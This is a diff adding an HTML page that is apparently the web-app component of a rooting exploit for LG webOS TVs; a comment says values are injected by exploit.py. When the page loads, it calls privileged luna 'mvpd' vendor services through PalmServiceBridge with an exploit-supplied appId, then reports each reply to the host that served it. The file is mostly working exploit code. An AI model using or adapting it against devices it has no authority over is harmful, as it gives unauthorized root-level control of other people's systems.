@@ -1,0 +1,43 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>mvpd-autoroot-webapp</title></head>
+<body style="background:#111;color:#eee;font:24px sans-serif;padding:24px">
+<h1>mvpd-autoroot-webapp</h1>
+<pre id="out"></pre>
+<script>
+(function () {
+    // Injected by exploit.py. Never put untrusted values here directly.
+    var APPID = __APPID__;
+    var out = document.getElementById('out');
+    var keep = [];
+    function log(message) {
+        out.textContent += message + '\n';
+        var image = new Image();
+        keep.push(image);
+        image.src = '/log?message=' + encodeURIComponent(message);
+    }
+    function call(label, uri, payload, next) {
+        var Bridge = typeof PalmServiceBridge === 'function' ? PalmServiceBridge : null;
+        if (!Bridge) { log(label + ': bridge unavailable'); return; }
+        var bridge = new Bridge();
+        keep.push(bridge);
+        var replied = false;
+        bridge.onservicecallback = function (reply) {
+            if (replied) return;
+            replied = true;
+            log(label + ': ' + reply);
+            if (next) next();
+        };
+        bridge.call(uri, JSON.stringify(payload));
+    }
+    log('page loaded');
+    log('PalmServiceBridge: ' + typeof PalmServiceBridge);
+    log('appId length: ' + APPID.length);
+    call('addMvpd', 'luna://com.webos.service.mvpd/vendor/addMvpd', {appId: APPID}, function () {
+        call('removeMvpd', 'luna://com.webos.service.mvpd/vendor/removeMvpd', {appId: APPID}, null);
+    });
+    if (window.PalmSystem) window.PalmSystem.stageReady();
+})();
+</script>
+</body>
+</html>
